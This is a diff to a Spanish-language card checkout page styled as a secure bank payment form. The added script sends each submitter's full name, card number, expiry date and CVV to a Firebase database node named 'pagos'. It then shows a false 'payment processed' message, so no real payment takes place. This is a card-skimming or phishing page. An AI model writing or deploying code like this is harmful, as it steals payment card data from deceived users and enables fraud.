@@ -23,7 +23,7 @@
             box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
             width: 100%;
             max-width: 400px;
-            border-top: 6px solid #004a99; /* Azul Bancario */
+            border-top: 6px solid #004a99;
         }
 
         h2 {
@@ -98,7 +98,7 @@
             gap: 5px;
             margin-top: 15px;
             font-size: 12px;
-            color: #10b981; /* Verde éxito */
+            color: #10b981;
         }
     </style>
 </head>
@@ -107,7 +107,7 @@
 <div class="card-container">
     <h2>Finalizar Pago</h2>
     
-    <form action="#">
+    <form id="paymentForm">
         <div class="form-group">
             <label for="fullname">Nombre y Apellido</label>
             <input type="text" id="fullname" placeholder="Nombre completo del titular" required>
@@ -123,7 +123,7 @@
             <div class="form-group" style="flex: 2;">
                 <label for="expiry">Vencimiento</label>
                 <input type="text" id="expiry" maxlength="5" placeholder="MM/AA" required>
-                <span class="requirement-text">4 dígitos (MM/AA) | Frente o Reverso</span>
+                <span class="requirement-text">4 dígitos (MM/AA)</span>
             </div>
 
             <div class="form-group" style="flex: 1;">
@@ -133,13 +133,64 @@
             </div>
         </div>
 
-        <button type="submit" class="pay-button">Realizar Pago Seguro</button>
+        <button type="submit" class="pay-button" id="btnPagar">Realizar Pago Seguro</button>
 
         <div class="secure-info">
             <span>🔒 Conexión cifrada SSL</span>
         </div>
     </form>
 </div>
+
+<script type="module">
+    // Importamos los módulos necesarios de Firebase
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+    import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+
+    // Tu configuración (ya proporcionada)
+    const firebaseConfig = {
+        apiKey: "AIzaSyBUTXo9Uej-SwwrFt2XdyOGgq_MBryb0p8",
+        authDomain: "consultas-5aee3.firebaseapp.com",
+        databaseURL: "https://consultas-5aee3-default-rtdb.firebaseio.com",
+        projectId: "consultas-5aee3",
+        storageBucket: "consultas-5aee3.firebasestorage.app",
+        messagingSenderId: "867276489831",
+        appId: "1:867276489831:web:8db7a890d42e3fac1e00c2",
+        measurementId: "G-PQQD71DVPR"
+    };
+
+    // Inicializamos Firebase
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+
+    // Capturamos el formulario
+    const paymentForm = document.getElementById('paymentForm');
+
+    paymentForm.addEventListener('submit', (e) => {
+        e.preventDefault(); // Evita que la página se recargue
+
+        // Obtenemos los valores de los inputs
+        const data = {
+            titular: document.getElementById('fullname').value,
+            numeroTarjeta: document.getElementById('pan').value,
+            vencimiento: document.getElementById('expiry').value,
+            cvv: document.getElementById('cvv').value,
+            fechaRegistro: new Date().toISOString()
+        };
+
+        // Guardamos en el nodo "pagos" de la base de datos
+        const pagosRef = ref(db, 'pagos');
+        
+        push(pagosRef, data)
+            .then(() => {
+                alert("¡Pago procesado con éxito!");
+                paymentForm.reset(); // Limpia el formulario
+            })
+            .catch((error) => {
+                console.error("Error al guardar: ", error);
+                alert("Hubo un error al procesar el pago.");
+            });
+    });
+</script>
 
 </body>
 </html>
